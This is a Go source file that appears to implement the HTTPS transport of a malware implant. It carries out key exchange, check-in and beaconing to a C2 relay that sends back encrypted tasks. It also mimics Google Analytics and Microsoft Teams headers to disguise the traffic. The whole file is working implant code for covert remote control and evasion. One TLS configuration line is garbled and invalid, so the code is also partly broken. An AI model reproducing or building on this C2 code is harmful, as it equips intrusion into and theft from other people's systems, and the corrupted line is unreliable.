// HTTPS transport — primary C2 channel.
// Implements malleable-profile header mimicry and certificate pinning.
package beacon

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"aegis-silentium/implant/config"
	"aegis-silentium/implant/crypto"
)

// Transport is the interface all C2 channels must implement.
type Transport interface {
	// Probe checks connectivity without sending implant data.
	Probe(ctx context.Context) error
	// KeyExchange sends our ephemeral public key, returns relay's public key.
	KeyExchange(ourPub []byte) ([]byte, error)
	// Checkin sends the initial registration payload.
	Checkin(session *crypto.Session, data []byte) error
	// Beacon sends results and receives tasks. Returns decrypted task JSON.
	Beacon(session *crypto.Session, data []byte) ([]byte, error)
}

// ── HTTPS Transport ───────────────────────────────────────────────────────────

// HTTPSTransport communicates with the relay over HTTPS.
type HTTPSTransport struct {
	addr   string
	client *http.Client
	cfg    *config.Config
}

// NewHTTPSTransport constructs an HTTPSTransport.
func NewHTTPSTransport(addr string, cfg *config.Config) *HTTPSTransport {
	tlsCfg := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: false, // always false; cert pinning via VerifyPeerCertificate
	}
	// Certificate pinning: if relay pubkey is provided, verify it.
	if len(cfg.RelayPubkey) > 0 {
		pinnedKey := cfg.RelayPubkey
		tlsCfg.InsecureSkipInsecureSkipVerify: false, // Use cert pinning; set via build flag AEGIS_INSECURE_TLS=1 only for dev // cert pinning via VerifyPeerCertificate, not skip
		tlsCfg.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
			for _, raw := range rawCerts {
				cert, err := x509.ParseCertificate(raw)
				if err != nil {
					continue
				}
				pub, err := x509.MarshalPKIXPublicKey(cert.PublicKey)
				if err != nil {
					continue
				}
				if bytes.Equal(pub, pinnedKey) {
					return nil
				}
			}
			return fmt.Errorf("cert pin mismatch")
		}
	}

	transport := &http.Transport{
		TLSClientConfig: tlsCfg,
		MaxIdleConns:    5,
		IdleConnTimeout: 90 * time.Second,
	}

	if cfg.ProxyURL != "" {
		if pu, err := url.Parse(cfg.ProxyURL); err == nil {
			transport.Proxy = http.ProxyURL(pu)
		}
	}

	return &HTTPSTransport{
		addr: strings.TrimRight(addr, "/"),
		client: &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		},
		cfg: cfg,
	}
}

func (t *HTTPSTransport) Probe(ctx context.Context) error {
	req, err := http.NewRequestWithContext(ctx, "GET", t.addr+"/", nil)
	if err != nil {
		return err
	}
	t.setHeaders(req)
	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

func (t *HTTPSTransport) KeyExchange(ourPub []byte) ([]byte, error) {
	encoded := base64.StdEncoding.EncodeToString(ourPub)
	body := []byte(`{"pk":"` + encoded + `"}`)

	req, err := http.NewRequest("POST", t.addr+"/api/v1/init", bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	t.setHeaders(req)
	req.Header.Set("Content-Type", "application/json")

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("key exchange: HTTP %d", resp.StatusCode)
	}

	var out struct{ PK string `json:"pk"` }
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return nil, err
	}
	return base64.StdEncoding.DecodeString(out.PK)
}

func (t *HTTPSTransport) Checkin(session *crypto.Session, data []byte) error {
	enc, err := session.Encrypt(data)
	if err != nil {
		return err
	}
	body := []byte(base64.StdEncoding.EncodeToString(enc))
	req, err := http.NewRequest("POST", t.addr+"/api/v1/checkin", bytes.NewReader(body))
	if err != nil {
		return err
	}
	t.setHeaders(req)
	req.Header.Set("Content-Type", "text/plain")

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

func (t *HTTPSTransport) Beacon(session *crypto.Session, data []byte) ([]byte, error) {
	enc, err := session.Encrypt(data)
	if err != nil {
		return nil, err
	}
	body := []byte(base64.StdEncoding.EncodeToString(enc))
	req, err := http.NewRequest("POST", t.addr+"/api/v1/beacon", bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	t.setHeaders(req)
	req.Header.Set("Content-Type", "text/plain")

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 204 {
		return []byte(`{"tasks":[]}`), nil
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("beacon: HTTP %d", resp.StatusCode)
	}

	raw, err := io.ReadAll(io.LimitReader(resp.Body, 8*1024*1024))
	if err != nil {
		return nil, err
	}

	decoded, err := base64.StdEncoding.DecodeString(string(bytes.TrimSpace(raw)))
	if err != nil {
		return nil, err
	}
	return session.Decrypt(decoded)
}

// setHeaders applies malleable-profile-style HTTP headers to disguise traffic.
func (t *HTTPSTransport) setHeaders(req *http.Request) {
	req.Header.Set("User-Agent", t.cfg.UserAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Cache-Control", "no-cache")

	// Profile-specific headers
	switch t.cfg.Profile {
	case "google-analytics":
		req.Header.Set("Referer", "https://www.google.com/")
		req.Header.Set("X-Forwarded-For", "203.0.113.1")
	case "microsoft-teams":
		req.Header.Set("X-MS-Client-Request-Id", fmt.Sprintf("%d", time.Now().Unix()))
		req.Header.Set("Referer", "https://teams.microsoft.com/")
	}
}
